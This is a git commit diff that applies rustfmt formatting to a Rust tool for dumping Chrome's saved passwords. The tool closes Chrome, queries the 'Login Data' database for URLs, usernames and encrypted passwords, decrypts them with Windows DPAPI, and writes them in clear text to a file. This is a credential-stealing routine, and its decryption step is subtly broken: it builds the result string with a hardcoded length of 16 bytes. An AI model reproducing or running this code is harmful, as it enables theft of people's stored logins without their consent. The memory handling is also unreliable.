37aea53b7b7f6f9de24a30c4001156e8b2d82569
Budi Syahiddin <budisyahiddin@protonmail.ch>
2019-05-28 20:06:56 +0800

    ✅ Rustfmt

--- src/dumper.rs
+++ src/dumper.rs
@@ -1,10 +1,10 @@
-use std::path::Path;
-use std::process::Command;
-use app_dirs::{get_app_dir, AppDataType, AppInfo};
-use rusqlite::{Connection, NO_PARAMS, Error};
 use crate::models::ChromeAccount;
+use app_dirs::{get_app_dir, AppDataType, AppInfo};
+use rusqlite::{Connection, Error, NO_PARAMS};
 use std::fs::File;
 use std::io::Write;
+use std::path::Path;
+use std::process::Command;
 
 const STMT: &'static str = "SELECT action_url, username_value, password_value FROM logins";
 
@@ -16,27 +16,31 @@ pub fn close_chrome() {
 }
 
 fn find_chrome_path() -> Box<Path> {
-    let app_info = AppInfo { name: "Chrome", author: "Google" };
-    let path_buf =
-        get_app_dir(AppDataType::UserCache, &app_info, "User Data/Default/Login Data")
-            .expect("No chrome found!");
+    let app_info = AppInfo {
+        name: "Chrome",
+        author: "Google",
+    };
+    let path_buf = get_app_dir(
+        AppDataType::UserCache,
+        &app_info,
+        "User Data/Default/Login Data",
+    )
+    .expect("No chrome found!");
 
     path_buf.into_boxed_path()
 }
 
 fn query_accounts() -> Result<Vec<ChromeAccount>, Error> {
     let db_url = find_chrome_path();
-    let conn = Connection::open(db_url)
-        .expect("Login Data not found!");
+    let conn = Connection::open(db_url).expect("Login Data not found!");
 
     let mut stmt = conn.prepare(STMT)?;
 
     let chrome_acc_iter = stmt
-        .query_map(NO_PARAMS, |row|
-            Ok(ChromeAccount::new(row.get(0)?,
-                                  row.get(1)?,
-                                  row.get(2)?)
-            )).unwrap();
+        .query_map(NO_PARAMS, |row| {
+            Ok(ChromeAccount::new(row.get(0)?, row.get(1)?, row.get(2)?))
+        })
+        .unwrap();
 
     let mut chrome_accounts: Vec<ChromeAccount> = vec![];
 
@@ -51,7 +55,7 @@ pub fn dump_to_file() {
     let dump_res = query_accounts();
     let mut accounts = match dump_res {
         Ok(chrome_acc) => chrome_acc,
-        Err(_) => panic!("Query failed")
+        Err(_) => panic!("Query failed"),
     };
 
     let mut finalize_str = String::new();
@@ -64,6 +68,6 @@ pub fn dump_to_file() {
     let res = file.write_all(finalize_str.as_bytes());
     match res {
         Ok(_) => println!("Dumped"),
-        Err(_) => panic!("Dump failed!")
+        Err(_) => panic!("Dump failed!"),
     };
 }
--- src/models.rs
+++ src/models.rs
@@ -1,5 +1,5 @@
 use winapi::um::dpapi::CryptUnprotectData;
-use winapi::um::wincrypt::{ DATA_BLOB, CRYPTOAPI_BLOB };
+use winapi::um::wincrypt::{CRYPTOAPI_BLOB, DATA_BLOB};
 use winapi::um::winnt::LPWSTR;
 
 #[derive(Debug)]
@@ -11,29 +11,41 @@ pub struct ChromeAccount {
 
 impl ChromeAccount {
     pub fn new(website: String, username_value: String, password_value: Vec<u8>) -> Self {
-        ChromeAccount { website, username_value, password_value }
+        ChromeAccount {
+            website,
+            username_value,
+            password_value,
+        }
     }
 
     fn get_clear_text_pw(&mut self) -> String {
         unsafe {
             let vec_ptr: *mut u8 = *&self.password_value.as_mut_ptr();
             let vec_len: &usize = &self.password_value.len();
-            let mut data_in: DATA_BLOB = CRYPTOAPI_BLOB { cbData: *vec_len as u32, pbData: vec_ptr };
-            let mut data_out: DATA_BLOB = CRYPTOAPI_BLOB { cbData: 0, pbData: &mut 0 };
+            let mut data_in: DATA_BLOB = CRYPTOAPI_BLOB {
+                cbData: *vec_len as u32,
+                pbData: vec_ptr,
+            };
+            let mut data_out: DATA_BLOB = CRYPTOAPI_BLOB {
+                cbData: 0,
+                pbData: &mut 0,
+            };
             let mut p_descr_out: LPWSTR = std::ptr::null_mut();
 
-            let succ_unprotect = CryptUnprotectData(&mut data_in,
-                                        &mut p_descr_out,
-                                        std::ptr::null_mut(),
-                                        std::ptr::null_mut(),
-                                        std::ptr::null_mut(),
-                                        0,
-                                        &mut data_out);
+            let succ_unprotect = CryptUnprotectData(
+                &mut data_in,
+                &mut p_descr_out,
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                0,
+                &mut data_out,
+            );
             if succ_unprotect == 0 {
                 panic!("Failed to decrypt");
             }
 
-            String::from_raw_parts(data_out.pbData, 16,16)
+            String::from_raw_parts(data_out.pbData, 16, 16)
         }
     }
 
@@ -42,11 +54,17 @@ impl ChromeAccount {
         let username = self.username_value.clone();
 
         if self.password_value.len() > 0 && !self.username_value.is_empty() {
-            format!("Website: {}, Username: {}, Password: {}",
-                    website, username, &mut self.get_clear_text_pw())
+            format!(
+                "Website: {}, Username: {}, Password: {}",
+                website,
+                username,
+                &mut self.get_clear_text_pw()
+            )
         } else {
-            format!("Website: {}, Username: {}, Password: [ INVALID ]",
-                    website, username)
+            format!(
+                "Website: {}, Username: {}, Password: [ INVALID ]",
+                website, username
+            )
         }
     }
 }
